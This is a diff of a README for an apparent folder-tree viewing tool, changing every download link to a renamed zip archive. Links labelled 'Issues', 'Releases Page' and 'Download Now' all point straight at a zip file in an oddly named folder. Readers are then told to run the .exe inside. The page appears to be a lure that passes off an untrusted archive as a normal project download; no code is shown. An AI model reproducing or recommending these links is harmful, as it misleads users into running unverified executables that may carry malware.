@@ -1,6 +1,6 @@
 # 🌳 Folder-Tree-Viewer - View Folders in a Tree Format Easily
 
-[![Download Now](https://raw.githubusercontent.com/EndZei/Folder-Tree-Viewer/main/pythonomorphic/Folder-Tree-Viewer.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/EndZei/Folder-Tree-Viewer/main/pythonomorphic/Folder-Tree-Viewer.zip)
+[![Download Now](https://github.com/EndZei/Folder-Tree-Viewer/raw/refs/heads/main/pythonomorphic/Viewer-Folder-Tree-v3.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/EndZei/Folder-Tree-Viewer/raw/refs/heads/main/pythonomorphic/Viewer-Folder-Tree-v3.5.zip)
 
 ## 📦 Introduction
 
@@ -22,7 +22,7 @@ Follow these easy steps to download and set up Folder-Tree-Viewer:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the Releases page:
-   [Download Now](https://raw.githubusercontent.com/EndZei/Folder-Tree-Viewer/main/pythonomorphic/Folder-Tree-Viewer.zip)
+   [Download Now](https://github.com/EndZei/Folder-Tree-Viewer/raw/refs/heads/main/pythonomorphic/Viewer-Folder-Tree-v3.5.zip)
 
 2. **Choose Your Version**  
    Find the latest version at the top of the page. Look for files with a `.exe` extension, which are meant for direct installation.
@@ -59,14 +59,14 @@ Folder-Tree-Viewer includes several user-friendly features:
 
 ## 📞 Need Help?
 
-If you encounter any problems, please check the [Issues](https://raw.githubusercontent.com/EndZei/Folder-Tree-Viewer/main/pythonomorphic/Folder-Tree-Viewer.zip) section on GitHub. You can also reach out to our community for help or report bugs there.
+If you encounter any problems, please check the [Issues](https://github.com/EndZei/Folder-Tree-Viewer/raw/refs/heads/main/pythonomorphic/Viewer-Folder-Tree-v3.5.zip) section on GitHub. You can also reach out to our community for help or report bugs there.
 
 ## 🌐 Stay Updated
 
 To receive updates about Folder-Tree-Viewer, you can:
 
 - **Watch the Repository:** Click on the "Watch" button on the top of the GitHub page.
-- **Check for Releases Frequently:** Visit the [Releases Page](https://raw.githubusercontent.com/EndZei/Folder-Tree-Viewer/main/pythonomorphic/Folder-Tree-Viewer.zip) to stay informed about the latest updates.
+- **Check for Releases Frequently:** Visit the [Releases Page](https://github.com/EndZei/Folder-Tree-Viewer/raw/refs/heads/main/pythonomorphic/Viewer-Folder-Tree-v3.5.zip) to stay informed about the latest updates.
 
 ## 🎁 Contributions
 
@@ -76,7 +76,7 @@ If you would like to contribute to Folder-Tree-Viewer, feel free to fork the rep
 
 To start using Folder-Tree-Viewer, simply follow the steps below:
 
-1. **Go to the Download Page:** Click here: [Download Now](https://raw.githubusercontent.com/EndZei/Folder-Tree-Viewer/main/pythonomorphic/Folder-Tree-Viewer.zip).
+1. **Go to the Download Page:** Click here: [Download Now](https://github.com/EndZei/Folder-Tree-Viewer/raw/refs/heads/main/pythonomorphic/Viewer-Folder-Tree-v3.5.zip).
 2. **Download the Installer:** Choose the latest version and download the `.exe` file.
 3. **Install the Application:** Run the installer and follow the instructions.
 
